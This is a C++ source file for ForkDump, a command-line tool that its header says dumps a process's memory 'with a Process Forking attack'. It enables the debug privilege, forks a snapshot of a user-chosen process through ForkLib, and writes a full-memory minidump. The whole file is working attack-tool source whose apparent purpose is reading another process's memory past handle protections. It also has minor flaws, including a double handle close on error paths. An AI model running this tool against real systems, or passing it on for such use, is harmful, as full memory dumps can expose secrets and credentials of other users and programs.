//
// ForkDump
// Dump the memory of a given process with a Process Forking attack.
// 
// COPYRIGHT Bill Demirkapi 2021. All Rights Reserved.
//
#include <Windows.h>
#include <cstdio>
#include <ForkLib.h>
#include <string>
#include <Dbghelp.h>

#pragma comment (lib, "Dbghelp.lib")
#pragma comment (lib, "ForkLib.lib")

/// <summary>
/// Escalate the current processes' debug privileges.
/// </summary>
/// <returns>TRUE if debug privilege enabled, FALSE otherwise.</returns>
BOOL
EscalateDebugPrivilege (
    VOID
    )
{
    BOOL result;
    HANDLE currentToken;
    LUID currentDebugValue;
    TOKEN_PRIVILEGES newTokenPrivilege;

    result = FALSE;
    currentToken = NULL;

    //
    // Open the current processes' token.
    //
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &currentToken) == FALSE)
    {
        printf("Failed to open the token of the current process with the last error %i.\n", GetLastError());
        goto Exit;
    }

    //
    // Lookup the LUID of the debug privilege.
    //
    if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &currentDebugValue) == FALSE)
    {
        printf("Failed to lookup the current debug privilege with the last error %i.\n", GetLastError());
        CloseHandle(currentToken);
        goto Exit;
    }

    //
    // Create our elevated token privilege.
    //
    newTokenPrivilege.PrivilegeCount = 1;
    newTokenPrivilege.Privileges[0].Luid = currentDebugValue;
    newTokenPrivilege.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    //
    // Adjust the current processes' token.
    //
    if (AdjustTokenPrivileges(currentToken, FALSE, &newTokenPrivilege, sizeof(newTokenPrivilege), NULL, NULL) == FALSE || 
        GetLastError() != ERROR_SUCCESS)
    {
        printf("Failed to adjust debug privileges with the last error %i.\n", GetLastError());
        CloseHandle(currentToken);
        goto Exit;
    }

    result = TRUE;
Exit:
    if (currentToken)
    {
        CloseHandle(currentToken);
    }
    return result;
}

int main(int argc, char** argv)
{
    int returnCode;
    std::string targetProcessIdStr;
    ULONG targetProcessId;
    std::string dumpFileName;
    HANDLE dumpFile;
    ForkSnapshot* snapshot;
    HANDLE snapshotProcess;

    dumpFile = NULL;
    snapshotProcess = NULL;
    snapshot = NULL;
    returnCode = FALSE;

    //
    // Ensure we have the expected arguments.
    //
    if (argc < 3)
    {
        printf("ForkDump.exe [dump file name] [target process ID]\n");
        return 0;
    }

    //
    // Retrieve and parse the arguments.
    //
    dumpFileName = argv[1];
    targetProcessIdStr = argv[2];
    targetProcessId = std::stoi(targetProcessIdStr);

    //
    // Create the dump file.
    //
    dumpFile = CreateFileA(dumpFileName.c_str(), GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (dumpFile == INVALID_HANDLE_VALUE)
    {
        printf("Failed to open dump file %s with the last error %i.\n", dumpFileName.c_str(), GetLastError());
        goto Exit;
    }

    //
    // Create a fork snapshot of the target.
    //
    snapshot = new ForkSnapshot(targetProcessId);
    snapshotProcess = snapshot->TakeSnapshot();
    if (snapshotProcess == NULL)
    {
        //
        // If our first try fails, attempt to escalate our debug privilege.
        //
        printf("Failed to take a snapshot of the target process. Attempting to escalate debug privilege...\n");
        if (EscalateDebugPrivilege() == FALSE)
        {
            printf("Failed to escalate debug privileges, are you running ForkDump as Administrator?\n");
            goto Exit;
        }

        //
        // Retry with debug privileges.
        //
        printf("Escalated debug privileges, attempting to take another snapshot.\n");
        snapshot->CleanSnapshot();
        delete snapshot;
        snapshot = new ForkSnapshot(targetProcessId);
        snapshotProcess = snapshot->TakeSnapshot();
        if (snapshotProcess == NULL)
        {
            //
            // If we failed once again, this likely means that there is a difference in process privileges or the handle was stripped.
            //
            printf("Second attempt at taking a snapshot of the target failed. It is likely that there is a difference in process privilege or the handle was stripped.\n");
            goto Exit;
        }
    }

    //
    // Create a dump of the forked process.
    //
    if (MiniDumpWriteDump(snapshotProcess, GetProcessId(snapshotProcess), dumpFile, MiniDumpWithFullMemory, NULL, NULL, NULL) == FALSE)
    {
        printf("Failed to create a dump of the forked process with the last error %i.\n", GetLastError());
        goto Exit;
    }

    returnCode = TRUE;
    printf("Successfully dumped process %i to %s!\n", targetProcessId, dumpFileName.c_str());
Exit:
    if (dumpFile != INVALID_HANDLE_VALUE)
    {
        CloseHandle(dumpFile);
    }
    if (snapshot != NULL)
    {
        snapshot->CleanSnapshot();
        delete snapshot;
    }
    return returnCode;
}